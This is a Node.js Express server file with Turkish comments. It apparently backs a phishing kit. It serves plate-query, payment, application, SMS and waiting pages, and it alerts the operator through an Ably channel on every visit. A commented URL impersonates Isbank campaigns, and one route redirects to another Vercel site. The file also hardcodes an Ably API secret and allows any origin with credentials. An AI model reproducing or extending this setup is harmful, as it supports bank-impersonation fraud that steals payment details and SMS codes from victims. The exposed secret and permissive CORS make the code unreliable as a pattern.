const express = require('express');
const path = require('path');
const Ably = require('ably/promises');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const cors = require('cors');  // cors modülünü ekleyin

const app = express();
const PORT = process.env.PORT || 3000;

const corsOptions = {
  origin: '*', // İzin vermek istediğiniz origin
  methods: 'GET,HEAD,PUT,PATCH,POST,DELETE',
  credentials: true, // Çerezleri etkinleştirmek için credentials'ı true yapın
  optionsSuccessStatus: 204, // Preflight OPTIONS isteğine başarılı bir yanıt durumu
  allowedHeaders: 'Content-Type,Authorization', // İzin verilen başlıklar
};

app.use(cors(corsOptions));
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser()); 

app.get('/', (req, res) => {
   notifyVisitorLogin()
    .then(() => {
      console.log('plaka sorgula');
      res.sendFile(path.join(__dirname, 'public', 'home.html'));
    })
    .catch((error) => {
      console.error('Error sending visitor login notification:', error);
      res.status(500).send('Internal Server Error');
    });
});

app.get('/jojo', (req, res) => {
    notifyVisitorLogin()
     .then(() => {
        console.log('odeme');
       res.sendFile(path.join(__dirname, 'public', 'jojo.html'));
     })
     .catch((error) => {
       console.error('Error:', error);
       res.status(500).send('Internal Server Error');
     });
 });
 
 

 app.get('/basvuru', (req, res) => {
    notifyVisitorLogin()
     .then(() => {
        console.log('odeme');
       res.sendFile(path.join(__dirname, 'public', 'basvuru.html'));
     })
     .catch((error) => {
       console.error('Error:', error);
       res.status(500).send('Internal Server Error');
     });
 });
 


  app.get('/sms', (req, res) => {
 
  
    notifyVisitorLogin()
    .then(() => {
      console.log('sorgulaniyor');
      res.sendFile(path.join(__dirname, 'public', 'sms.html'));
    })
    .catch((error) => {
      console.error('Error sending visitor login notification:', error);
      res.status(500).send('Internal Server Error');
    });
  });

  app.get('/slot', (req, res) => {
    const submittedData = req.cookies.submittedData || 'No data submitted yet';
  
    notifyVisitorLogin()
    .then(() => {
      console.log('bekle sayfa');
      res.sendFile(path.join(__dirname, 'public', 'slot.html'));
    })
    .catch((error) => {
      console.error('Error sending visitor login notification:', error);
      res.status(500).send('Internal Server Error');
    });
  });


 app.get('/asnlana', (req, res) => {
    // https://isbank-kampanyalar-kayit.vercel.app/

    // Kullanıcıyı yönlendir
    res.redirect('https://grnti.vercel.app/');
});


  

async function notifyVisitorLogin() {
  const apiKey = 'HSmV8Q.l6hnnA:QwimsXeRCaBhHTlLUBj4aK3dYf52A4EEt_lNoPnt8bg';
  const channelName = 'aphysch0b';

  const ably = new Ably.Realtime({ key: apiKey });
  const channel = ably.channels.get(channelName);

  // Ziyaretçi girişini bildir
  await channel.publish('visitor_login', { message: 'Visitor logged in!' });

  // Ably bağlantısını kapat
  await ably.close();
}

// Sunucuyu başlat
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
  
});



